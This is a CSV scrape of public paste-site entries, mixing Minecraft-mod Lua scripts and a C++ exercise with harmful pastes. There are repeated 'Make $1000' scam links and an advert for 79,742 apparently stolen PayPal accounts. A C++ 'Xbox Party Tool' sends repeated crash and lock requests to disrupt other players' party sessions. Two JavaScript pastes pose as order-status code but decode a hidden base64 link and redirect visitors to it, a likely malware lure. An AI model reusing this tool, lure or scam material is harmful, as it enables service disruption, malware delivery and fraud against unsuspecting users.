id,title,username,language,date,content
X0B3xiH8,Make $1000 15-MINUTES  (BEGINNER) ME,jrgsdv,JavaScript,Sunday 27th of April 2025 01:05:52 AM CDT," 
Pdf https://tinyurl.com/privguidee

cCRjKO7ykv
"
8cpPXKjZ,三维定位 426 v2,jaklsfjlsak,Lua,Sunday 27th of April 2025 01:02:19 AM CDT,"-- 3D-Offset-Driven Ship Jump & Mining-Laser Align
-- Listens for { x, y, z } on Rednet protocol ""3DOffsetBroadcast""
-- and computes an offset jump point back toward the ship.

-- 1) Configuration
local offsetDistance = 25

-- 2) Wrap your ship core
local ship = peripheral.find(""warpdriveShipCore"")
assert(ship, ""No warpdriveShipCore detected!"")

-- 3) Pre-compute ship dimensions & status
local ship_front, ship_right, ship_up   = ship.dim_positive()
local ship_back,  ship_left,  ship_down = ship.dim_negative()

-- 4) Instructions
print(""Waiting for 3DOffsetBroadcast → Redstone 'front' must be ON to accept jumps"")

-- 5) Open Rednet on all modems
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""modem"" then
    rednet.open(side)
  end
end

-- 6) Main loop: only react when redstone 'front' is high
while true do
  if redstone.getInput(""front"") then
    -- wait up to 0.5s for a broadcast on 3DOffsetBroadcast
    local sender, message = rednet.receive(""3DOffsetBroadcast"", 0.5)
    if sender and message.x and message.y and message.z then
      local lastLx, lastLy, lastLz =
        tonumber(message.x),
        tonumber(message.y),
        tonumber(message.z)

      print(string.format(
        ""Received target from %d → X:%d  Y:%d  Z:%d"",
        sender, lastLx, lastLy, lastLz
      ))

      -- ship current position
      local mx, my, mz = ship.getLocalPosition()

      -- vector from laser target back toward ship
      local vx, vy, vz = mx - lastLx, my - lastLy, mz - lastLz
      local dist = math.sqrt(vx*vx + vy*vy + vz*vz)

      if dist > 0 then
        -- unit vector
        local ux, uy, uz = vx/dist, vy/dist, vz/dist

        -- offset point
        local dx = math.floor(lastLx + ux*offsetDistance + 0.5)
        local dy = math.floor(lastLy + uy*offsetDistance + 0.5)
        local dz = math.floor(lastLz + uz*offsetDistance + 0.5)

        print(string.format(
          ""Jump coords → X:%d  Y:%d  Z:%d"",
          dx, dy, dz
        ))

        -- orientation & thresholds
        local rx, ry, rz    = ship.getOrientation()
        local minFB         = math.abs(ship_front + ship_back + 1)
        local minLR         = math.abs(ship_left  + ship_right + 1)
        local minUD         = math.abs(ship_up    + ship_down + 1)

        -- desired move in world-space
        local jx, jy, jz    = dx - mx, dy - my, dz - mz

        -- map to ship axes
        local fb, lr = 0, 0
        local ud      = jy
        if     rx ==  1 then fb, lr = jx,  jz
        elseif rx == -1 then fb, lr = -jx, -jz
        elseif rz ==  1 then fb, lr = jz, -jx
        elseif rz == -1 then fb, lr = -jz, jx
        end

        -- threshold check
        if math.abs(fb) < minFB
           and math.abs(ud) < minUD
           and math.abs(lr) < minLR then
          print(""Movement too small—skipping jump."")
        else
          ship.movement(fb, ud, lr)
          ship.rotationSteps(0)
          ship.command(""MANUAL"", true)
        end
      else
        print(""Error: ship and target coincide—no movement."")
      end
    end
  else
    -- redstone is off, pause briefly
    os.sleep(0.1)
  end
end
"
0UzhHsCA,Untitled,zpolice281,C++,Sunday 27th of April 2025 01:02:10 AM CDT,"#include <windows.h>
#include <commctrl.h>
#include <iostream>
#include <string>
#include <memory>
#include <ppltasks.h>
#include <xbox/live/xbox_live.h>
#include <winrt/Windows.Web.Http.h>
#include <winrt/Windows.Security.Authentication.Web.Core.h>
#include <winrt/Windows.Security.Credentials.h>
#include <winrt/Windows.Data.Json.h>

using namespace concurrency;
using namespace winrt;
using namespace winrt::Windows::Web::Http;
using namespace winrt::Windows::Security::Authentication::Web::Core;
using namespace winrt::Windows::Security::Credentials;
using namespace winrt::Windows::Data::Json;
using namespace xbox::services;
using namespace xbox::services::system;

// Config
const std::wstring XBL_TOKEN = L""YOUR_XBL_TOKEN_HERE""; // Replace with your XBL token
const std::wstring XBL_AUTH_URL = L""https://xsts.auth.xboxlive.com/xsts/authorize"";
const std::wstring PROFILE_URL = L""https://profile.xboxlive.com/users/me/profile/settings"";
const std::wstring SESSIONS_URL = L""https://sessiondirectory.xboxlive.com/sessions"";
const std::wstring SESSION_URL_BASE = L""https://sessiondirectory.xboxlive.com/handles/"";
const std::wstring PARTYHAX_API_BASE = L""https://partyhax.club/api/"";

// Global variables for UI state
bool unkickable_enabled = false;
int crash_intensity = 1;
std::wstring current_xsts_token;
std::wstring current_session_id;
std::wstring current_xuid;
int selected_action = 0; // 0 = Crash, 1 = Lock

// UI control IDs
#define IDC_TAB 1000
#define IDC_TOGGLE 1001
#define IDC_SLIDER 1002
#define IDC_BUTTON 1003
#define IDC_COMBO 1004

// Function to get XSTS token from XBL token
task<xbox_live_result<token_and_signature_result>> get_xsts_token(const std::wstring& xbl_token)
{
    HttpClient client;
    HttpRequestMessage request(HttpMethod::Post(), Uri(XBL_AUTH_URL));
    
    request.Headers().Append(L""Authorization"", L""XBL3.0 x="" + xbl_token);
    request.Headers().Append(L""Content-Type"", L""application/json"");
    
    std::wstring payload = L""{\""Properties\"":{\""SandboxId\"":\""RETAIL\"",\""UserTokens\"":[\"""" + xbl_token + L""\""]},\""RelyingParty\"":\""http://xboxlive.com\"",\""TokenType\"":\""JWT\""}"";
    request.Content(HttpStringContent(payload));
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                auto result = response.Content().ReadAsStringAsync().get();
                std::wstring token = result;
                return xbox_live_result<token_and_signature_result>(token_and_signature_result(token, L""""));
            }
            throw std::runtime_error(""Failed to get XSTS token"");
        });
}

// Function to get XUID from profile
task<std::wstring> get_xuid(const std::wstring& xsts_token)
{
    HttpClient client;
    HttpRequestMessage request(HttpMethod::Get(), Uri(PROFILE_URL));
    
    request.Headers().Append(L""Authorization"", L""XBL3.0 x="" + xsts_token);
    request.Headers().Append(L""Content-Type"", L""application/json"");
    request.Headers().Append(L""X-Xbl-Contract-Version"", L""2"");
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                auto result = response.Content().ReadAsStringAsync().get();
                JsonObject json = JsonObject::Parse(result);
                std::wstring xuid = json.GetNamedString(L""id"");
                return xuid;
            }
            throw std::runtime_error(""Failed to get XUID"");
        });
}

// Function to get current party session ID
task<std::wstring> get_party_session_id(const std::wstring& xsts_token, const std::wstring& xuid)
{
    HttpClient client;
    HttpRequestMessage request(HttpMethod::Get(), Uri(SESSIONS_URL + L""?xuid="" + xuid));
    
    request.Headers().Append(L""Authorization"", L""XBL3.0 x="" + xsts_token);
    request.Headers().Append(L""Content-Type"", L""application/json"");
    request.Headers().Append(L""X-Xbl-Contract-Version"", L""2"");
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                auto result = response.Content().ReadAsStringAsync().get();
                JsonObject json = JsonObject::Parse(result);
                JsonArray sessions = json.GetNamedArray(L""sessions"");
                if (sessions.Size() > 0) {
                    std::wstring session_id = sessions.GetObjectAt(0).GetNamedString(L""sessionId"");
                    return session_id;
                }
                throw std::runtime_error(""No active party sessions found"");
            }
            throw std::runtime_error(""Failed to get sessions"");
        });
}

// Function to make yourself unkickable using PartyHax API
task<void> make_unkickable(const std::wstring& xbl_token, const std::wstring& xuid)
{
    HttpClient client;
    std::wstring url = PARTYHAX_API_BASE + L""xboxpartyunkickable/xuid="" + xuid + L"",Token="" + xbl_token;
    HttpRequestMessage request(HttpMethod::Get(), Uri(url));
    
    request.Headers().Append(L""Content-Type"", L""application/json"");
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                std::cout << ""PartyHax API: Successfully made unkickable.\n"";
            } else {
                std::cerr << ""PartyHax API: Failed to make unkickable. Status: "" << static_cast<int>(response.StatusCode()) << ""\n"";
            }
        });
}

// Function to crash the party using PartyHax API with fallback
task<void> crash_party(const std::wstring& xbl_token, const std::wstring& xuid, const std::wstring& session_id, int intensity)
{
    HttpClient client;
    std::wstring url = PARTYHAX_API_BASE + L""xboxpartycrash/xuid="" + xuid + L"",Token="" + xbl_token;
    HttpRequestMessage request(HttpMethod::Get(), Uri(url));
    
    request.Headers().Append(L""Content-Type"", L""application/json"");
    
    bool partyhax_success = false;
    for (int i = 0; i < intensity; ++i) {
        create_task(client.SendRequestAsync(request))
            .then([&partyhax_success](HttpResponseMessage response) {
                if (response.StatusCode() == HttpStatusCode::Ok) {
                    std::cout << ""PartyHax API: Crash request sent.\n"";
                    partyhax_success = true;
                } else {
                    std::cerr << ""PartyHax API: Crash request failed. Status: "" << static_cast<int>(response.StatusCode()) << ""\n"";
                }
            });
        Sleep(50);
    }
    
    // Fallback to direct Xbox Live method if PartyHax fails
    if (!partyhax_success && !session_id.empty()) {
        std::cout << ""Falling back to direct Xbox Live crash method...\n"";
        HttpRequestMessage fallback_request(HttpMethod::Post(), Uri(SESSION_URL_BASE + session_id + L""/join""));
        fallback_request.Headers().Append(L""Authorization"", L""XBL3.0 x="" + xbl_token);
        fallback_request.Headers().Append(L""Content-Type"", L""application/json"");
        fallback_request.Headers().Append(L""X-Xbl-Contract-Version"", L""2"");
        
        std::wstring payload = L""{\""userId\"":\""FORCE_CRASH\"",\""inviteId\"":null,\""bypassInvite\"":true,\""overload\"":true,\""crashApp\"":true}"";
        fallback_request.Content(HttpStringContent(payload));
        
        for (int i = 0; i < intensity; ++i) {
            create_task(client.SendRequestAsync(fallback_request))
                .then([](HttpResponseMessage response) {
                    std::cout << ""Fallback: Crash request sent. Status: "" << static_cast<int>(response.StatusCode()) << ""\n"";
                });
            Sleep(50);
        }
    }
    
    return create_task([]() {});
}

// Function to lock the party using PartyHax API
task<void> lock_party(const std::wstring& xbl_token, const std::wstring& xuid)
{
    HttpClient client;
    std::wstring url = PARTYHAX_API_BASE + L""xboxpartylock/xuid="" + xuid + L"",Token="" + xbl_token;
    HttpRequestMessage request(HttpMethod::Get(), Uri(url));
    
    request.Headers().Append(L""Content-Type"", L""application/json"");
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                std::cout << ""PartyHax API: Party locked successfully.\n"";
            } else {
                std::cerr << ""PartyHax API: Failed to lock party. Status: "" << static_cast<int>(response.StatusCode()) << ""\n"";
            }
        });
}

// Window procedure for the UI
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    static HWND hwndTab, hwndToggle, hwndSlider, hwndButton, hwndCombo;
    static HFONT hFont;

    switch (msg)
    {
    case WM_CREATE:
    {
        // Initialize common controls
        INITCOMMONCONTROLSEX icex;
        icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
        icex.dwICC = ICC_TAB_CLASSES | ICC_TRACKBAR_CLASS;
        InitCommonControlsEx(&icex);

        // Create font
        hFont = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET,
                           OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                           DEFAULT_PITCH | FF_SWISS, L""Segoe UI"");

        // Create tab control
        hwndTab = CreateWindow(WC_TABCONTROL, L"""", WS_CHILD | WS_VISIBLE,
                               5, 5, 390, 290, hwnd, (HMENU)IDC_TAB, GetModuleHandle(NULL), NULL);
        SendMessage(hwndTab, WM_SETFONT, (WPARAM)hFont, TRUE);

        TCITEM tie;
        tie.mask = TCIF_TEXT;
        tie.pszText = L""Party Controls"";
        TabCtrl_InsertItem(hwndTab, 0, &tie);

        // Create toggle (checkbox)
        hwndToggle = CreateWindow(L""BUTTON"", L""Unkickable"", WS_CHILD | WS_VISIBLE | BS_CHECKBOX,
                                  20, 40, 150, 30, hwnd, (HMENU)IDC_TOGGLE, GetModuleHandle(NULL), NULL);
        SendMessage(hwndToggle, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Create slider
        CreateWindow(L""STATIC"", L""Crash Intensity: 1"", WS_CHILD | WS_VISIBLE,
                     20, 80, 150, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);
        hwndSlider = CreateWindow(TRACKBAR_CLASS, L"""", WS_CHILD | WS_VISIBLE | TBS_AUTOTICKS,
                                  20, 100, 200, 30, hwnd, (HMENU)IDC_SLIDER, GetModuleHandle(NULL), NULL);
        SendMessage(hwndSlider, TBM_SETRANGE, TRUE, MAKELONG(1, 20));
        SendMessage(hwndSlider, TBM_SETPOS, TRUE, 1);
        SendMessage(hwndSlider, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Create dropdown
        hwndCombo = CreateWindow(WC_COMBOBOX, L"""", WS_CHILD | WS_VISIBLE | CBS_DROPDOWNLIST,
                                 20, 140, 150, 100, hwnd, (HMENU)IDC_COMBO, GetModuleHandle(NULL), NULL);
        SendMessage(hwndCombo, CB_ADDSTRING, 0, (LPARAM)L""Crash Party"");
        SendMessage(hwndCombo, CB_ADDSTRING, 0, (LPARAM)L""Lock Party"");
        SendMessage(hwndCombo, CB_SETCURSEL, 0, 0);
        SendMessage(hwndCombo, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Create button
        hwndButton = CreateWindow(L""BUTTON"", L""Execute"", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                                  20, 180, 100, 30, hwnd, (HMENU)IDC_BUTTON, GetModuleHandle(NULL), NULL);
        SendMessage(hwndButton, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Set dark theme
        SetWindowLong(hwnd, GWL_STYLE, GetWindowLong(hwnd, GWL_STYLE) | WS_CLIPCHILDREN);
        SetBkColor(GetDC(hwnd), RGB(30, 30, 30));
        break;
    }
    case WM_COMMAND:
    {
        if (LOWORD(wParam) == IDC_TOGGLE)
        {
            unkickable_enabled = (SendMessage(hwndToggle, BM_GETCHECK, 0, 0) == BST_CHECKED);
            if (unkickable_enabled && !current_xuid.empty())
            {
                make_unkickable(XBL_TOKEN, current_xuid);
            }
        }
        if (LOWORD(wParam) == IDC_COMBO)
        {
            if (HIWORD(wParam) == CBN_SELCHANGE)
            {
                selected_action = SendMessage(hwndCombo, CB_GETCURSEL, 0, 0);
            }
        }
        if (LOWORD(wParam) == IDC_BUTTON)
        {
            if (!current_xuid.empty())
            {
                switch (selected_action)
                {
                case 0: // Crash Party
                    crash_party(XBL_TOKEN, current_xuid, current_session_id, crash_intensity);
                    break;
                case 1: // Lock Party
                    lock_party(XBL_TOKEN, current_xuid);
                    break;
                }
            }
            else
            {
                MessageBox(hwnd, L""XUID not found. Ensure auth succeeded and try again."", L""Error"", MB_OK | MB_ICONERROR);
            }
        }
        break;
    }
    case WM_HSCROLL:
    {
        if ((HWND)lParam == hwndSlider)
        {
            crash_intensity = SendMessage(hwndSlider, TBM_GETPOS, 0, 0);
            wchar_t buf[32];
            wsprintf(buf, L""Crash Intensity: %d"", crash_intensity);
            SetWindowText(GetDlgItem(hwnd, IDC_STATIC), buf);
        }
        break;
    }
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        SetBkColor(hdc, RGB(30, 30, 30));
        SetTextColor(hdc, RGB(200, 200, 200));
        EndPaint(hwnd, &ps);
        break;
    }
    case WM_DESTROY:
        DeleteObject(hFont);
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Initialize WinRT
    winrt::init_apartment();

    // Register window class
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L""XboxPartyToolClass"";
    wc.hbrBackground = CreateSolidBrush(RGB(30, 30, 30));
    RegisterClass(&wc);

    // Create window
    HWND hwnd = CreateWindow(L""XboxPartyToolClass"", L""Xbox Party Tool"",
                            WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                            CW_USEDEFAULT, CW_USEDEFAULT, 400, 300,
                            NULL, NULL, hInstance, NULL);
    ShowWindow(hwnd, nCmdShow);

    // Authenticate and get XUID/session ID
    try
    {
        get_xsts_token(XBL_TOKEN)
            .then([](xbox_live_result<token_and_signature_result> result) {
                if (!result.err()) {
                    current_xsts_token = result.payload().token();
                    std::wcout << L""Got XSTS token: "" << current_xsts_token << L""\n"";
                    return current_xsts_token;
                }
                throw std::runtime_error(""Token fetch failed"");
            })
            .then([](std::wstring xsts_token) {
                return get_xuid(xsts_token)
                    .then([xsts_token](std::wstring xuid) {
                        current_xuid = xuid;
                        std::wcout << L""Got XUID: "" << xuid << L""\n"";
                        return std::make_pair(xsts_token, xuid);
                    });
            })
            .then([](std::pair<std::wstring, std::wstring> pair) {
                auto [xsts_token, xuid] = pair;
                return get_party_session_id(xsts_token, xuid)
                    .then([xsts_token, xuid](std::wstring session_id) {
                        current_session_id = session_id;
                        std::wcout << L""Got party session ID: "" << session_id << L""\n"";
                    });
            }).get();
    }
    catch (const std::exception& e)
    {
        MessageBox(hwnd, L""Failed to initialize: "" + std::wstring(e.what(), e.what() + strlen(e.what())), L""Error"", MB_OK | MB_ICONERROR);
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    winrt::uninit_apartment();
    return 0;
}"
nRV8YvXD,C++ Weapon Test,shadowlucario50,C++,Sunday 27th of April 2025 12:58:48 AM CDT,"#include <iostream>
#include <ctime>


void weapon(int tool, int atk, int def, int spd);
void weapon(int tool);

int main(){

    int hp = 100;
    int atk = 40;
    int def = 40;
    int spd = 40;
    int tool;
    
    std::cout << ""Choose a Weapon: \n"";
    for(int i=1; i <=5; i++){
        std::cout << i << "" "";
        weapon(i);
        std::cout << '\n';
    }
    std::cin >> tool;

    weapon(tool,atk,def,spd);

    return 0;
}

void weapon(int tool){
    switch (tool) {
        case 1:
            std::cout << ""Knife"";
            break;
        case 2:
            std::cout << ""Axe"";
            break;
        case 3:
            std::cout << ""Harp"";
            break;
        case 4:
            std::cout << ""Sword"";
            break;
        case 5:
            std::cout << ""Shield"";
            break;
        default:
            std::cout << ""Fists"";
            break;
    }
}

void weapon(int tool, int atk, int def, int spd) {
    switch (tool) {
        case 1:
            std::cout << ""Knife: "";
            atk += 5;
            def -= 2;
            spd += 5;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        case 2:
            std::cout << ""Axe: "";
            atk += 10;
            def -= 3;
            spd -= 3;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        case 3:
            std::cout << ""Harp: "";
            atk += 1;
            def += 3;
            spd += 2;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        case 4:
            std::cout << ""Sword: "";
            atk += 8;
            def -= 5;
            spd += 4;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        case 5:
            std::cout << ""Shield: "";
            atk -= 1;
            def += 9;
            spd -= 4;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        default:
            std::cout << ""Fists: "";
            atk +=1;
            spd +=8;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
    }
}"
7h0yPVDT,Untitled,dentira,JavaScript,Sunday 27th of April 2025 12:57:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23543/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X7v4kfFf,EARN $900 INSTANTLY 2025 M6,jrgsdv,JavaScript,Sunday 27th of April 2025 12:56:36 AM CDT," 
Pdf https://tinyurl.com/privguidee

gh3OqezONO
"
99Hu4F5D,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Sunday 27th of April 2025 12:53:26 AM CDT,79742 Accounts Posted On https://t.me/leakedbyem1nem
tfqc42mJ,Pocket Todo,Alexr360,Lua,Sunday 27th of April 2025 12:51:06 AM CDT,"-- pocket_todo.lua
-- A pocket computer todo list with notes, completed section, clickable buttons, and backup command

-- Data files
local TODO_FILE      = ""todo.txt""
local NOTES_FILE     = ""notes.txt""
local COMPLETED_FILE = ""completed.txt""

-- Data tables
local items     = {}
local notes     = """"
local completed = {}

-- Utility: load list from file
local function loadList(file, tbl)
  if fs.exists(file) then
    local f = fs.open(file, ""r"")
    local line = f.readLine()
    while line do
      table.insert(tbl, line)
      line = f.readLine()
    end
    f.close()
  end
end

-- Initial load
loadList(TODO_FILE, items)
loadList(COMPLETED_FILE, completed)
if fs.exists(NOTES_FILE) then
  local f = fs.open(NOTES_FILE, ""r"")
  notes = f.readAll() or """"
  f.close()
end

-- Utility: save all data
local function save()
  local f = fs.open(TODO_FILE, ""w"")
  for _,v in ipairs(items) do f.writeLine(v) end
  f.close()
  local f2 = fs.open(COMPLETED_FILE, ""w"")
  for _,v in ipairs(completed) do f2.writeLine(v) end
  f2.close()
  local f3 = fs.open(NOTES_FILE, ""w"")
  f3.write(notes)
  f3.close()
end

-- Button mapping
local buttons = {}

-- Redraw UI to term
local function redraw()
  term.setBackgroundColor(colors.black)
  term.clear()
  term.setCursorPos(1,1)
  term.setTextColor(colors.white)
  local w,h = term.getSize()
  local y = 1
  buttons = {}

  -- Notes section
  if notes:match(""%S"") then
    term.setCursorPos(1,y)
    term.write(""Notes:"")
    y = y + 1
    local line = notes
    if #line > w then line = line:sub(1, w-3) .. ""..."" end
    term.setCursorPos(1, y)
    term.write(line)
    y = y + 1
    -- blank line after notes
    y = y + 1
  end

  -- To-Do List
  if y <= h then
    term.setCursorPos(1,y)
    term.write(""To-Do List:"")
    y = y + 1
    for i = 1, math.min(#items, h - y) do
      local text = string.format(""%2d. %s"", i, items[i])
      if #text > w-6 then text = text:sub(1, w-9) .. ""..."" end
      term.setCursorPos(1, y + i - 1)
      term.write(text)
      -- Done button
      local bx = w - 3
      term.setCursorPos(bx, y + i - 1)
      term.write(""[D]"")
      table.insert(buttons, {x1 = bx, x2 = bx + 2, y = y + i - 1, type = ""done"", idx = i})
    end
    y = y + math.min(#items, h - y) + 1
  end

  -- Completed Section
  if #completed > 0 and y <= h then
    term.setCursorPos(1,y)
    term.write(""Completed:"")
    y = y + 1
    for i = 1, math.min(#completed, h - y + 1) do
      local entry = completed[i]
      local text = ""- "" .. entry
      if #text > w-10 then text = text:sub(1, w-13) .. ""..."" end
      term.setCursorPos(1, y + i - 1)
      term.write(text)
      -- Restore button
      local rx = w - 7
      term.setCursorPos(rx, y + i - 1)
      term.write(""[R]"")
      table.insert(buttons, {x1 = rx, x2 = rx + 2, y = y + i - 1, type = ""restore"", idx = i})
      -- Delete button
      local dx = w - 3
      term.setCursorPos(dx, y + i - 1)
      term.write(""[X]"")
      table.insert(buttons, {x1 = dx, x2 = dx + 2, y = y + i - 1, type = ""delete"", idx = i})
    end
  end
end

-- Handle mouse clicks
local function handleClick(x,y)
  for _,b in ipairs(buttons) do
    if y == b.y and x >= b.x1 and x <= b.x2 then
      if b.type == ""done"" then
        table.insert(completed, items[b.idx])
        table.remove(items, b.idx)
      elseif b.type == ""restore"" then
        table.insert(items, completed[b.idx])
        table.remove(completed, b.idx)
      elseif b.type == ""delete"" then
        table.remove(completed, b.idx)
      end
      save()
      redraw()
      return
    end
  end
end

-- Initial draw
redraw()

-- Main loops: mouse and command
parallel.waitForAny(
  function()
    while true do
      local event, button, x, y = os.pullEvent(""mouse_click"")
      if button == 1 then handleClick(x,y) end
    end
  end,
  function()
    while true do
      term.setCursorPos(1,1)
      local input = read()
      local cmd, rest = input:match(""^(%S+)%s*(.*)$"") or {input, """"}
      if cmd == ""add"" and #rest > 0 then
        table.insert(items, rest)
      elseif cmd == ""remove"" and tonumber(rest) and items[tonumber(rest)] then
        table.remove(items, tonumber(rest))
      elseif cmd == ""done"" and tonumber(rest) and items[tonumber(rest)] then
        table.insert(completed, items[tonumber(rest)])
        table.remove(items, tonumber(rest))
      elseif cmd == ""clearcompleted"" then
        completed = {}
      elseif cmd == ""backup"" then
        if fs.exists(TODO_FILE) then fs.copy(TODO_FILE, ""/disk/"" .. TODO_FILE) end
        if fs.exists(COMPLETED_FILE) then fs.copy(COMPLETED_FILE, ""/disk/"" .. COMPLETED_FILE) end
        print(""Backup complete. Press Enter to continue."")
        read()
      elseif cmd == ""note"" then
        notes = rest or """"
      elseif cmd == ""clearnote"" then
        notes = """"
      elseif cmd == ""exit"" then
        print(""Goodbye!"")
        os.exit()
      else
        print(""Invalid command. Press Enter to continue."")
        read()
      end
      save()
      redraw()
    end
  end
)"
hccuBQvA,Make $1000 15-MINUTES (BEGINNER) 96,jrgsdv,JavaScript,Sunday 27th of April 2025 12:47:22 AM CDT," 
Pdf https://tinyurl.com/privguidee

PEH0gB58oO
"
31HeSR9C,Products.js,dentira,JavaScript,Sunday 27th of April 2025 12:42:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32796/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7vdAUbhS,核心跳船 信号接收器 v2,jaklsfjlsak,Lua,Sunday 27th of April 2025 12:41:59 AM CDT,"local ship  = peripheral.find(""warpdriveShipCore"")
local miner = peripheral.find(""warpdriveMiningLaser"")

local ship_front, ship_right, ship_up   = ship.dim_positive()
local ship_back,  ship_left,  ship_down = ship.dim_negative()

-- Open rednet on the modem side (adjust ""top"" as needed)
rednet.open(""top"")
print(""Waiting for coordinate broadcasts when redstone is active on the front..."")

while true do
  if redstone.getInput(""front"") then
    -- listen for any protocol, 0.5s timeout
    local senderID, message, protocol = rednet.receive(nil, 0.5)
    if senderID and message and message.x and message.y and message.z then
      local lastLx = tonumber(message.x)
      local lastLy = tonumber(message.y)
      local lastLz = tonumber(message.z)

      -- choose reference point based on protocol
      if protocol == ""HorizontalJumpBroadcast""
      or protocol == ""HorizontalJumpMinerBroadcast"" then
        local mx, my, mz
        if protocol == ""HorizontalJumpBroadcast"" then
          mx, my, mz = ship.getLocalPosition()
        else
          mx, my, mz = miner.getLocalPosition()
        end

        print((""Received %s → X:%d, Y:%d, Z:%d"")
          :format(protocol, lastLx, lastLy, lastLz))

        -- compute movement vector (X/Z plane only)
        local dx = lastLx - mx
        local dz = lastLz - mz

        local rx, ry, rz     = ship.getOrientation()
        local minFB          = math.abs(ship_front + ship_back + 1)
        local minLR          = math.abs(ship_left  + ship_right + 1)
        local forwardBackMov = 0
        local leftRightMov   = 0

        if     rx ==  1 then forwardBackMov, leftRightMov =  dx,  dz
        elseif rx == -1 then forwardBackMov, leftRightMov = -dx, -dz
        elseif rz ==  1 then forwardBackMov, leftRightMov =  dz, -dx
        elseif rz == -1 then forwardBackMov, leftRightMov = -dz,  dx
        end

        if math.abs(forwardBackMov) < minFB and math.abs(leftRightMov) < minLR then
          print(""The movement is too small!"")
        else
          ship.movement(forwardBackMov, 0, leftRightMov)
          ship.rotationSteps(0)
          ship.command(""MANUAL"", true)
        end
      end
    end
  else
    -- no redstone signal: wait before retrying
    os.sleep(0.1)
  end
end
"
QbybTxmX,"[MetArt] Luna Pica, Foxy Alissa, Bjorg Larson - Apr 26",MarcSpencer,HTML,Sunday 27th of April 2025 12:38:32 AM CDT,"[MetArt] Luna Pica, Foxy Alissa, Bjorg Larson - Apr 26
[MetArt] Luna Pica - Artisan Inspired (x) - Apr 26
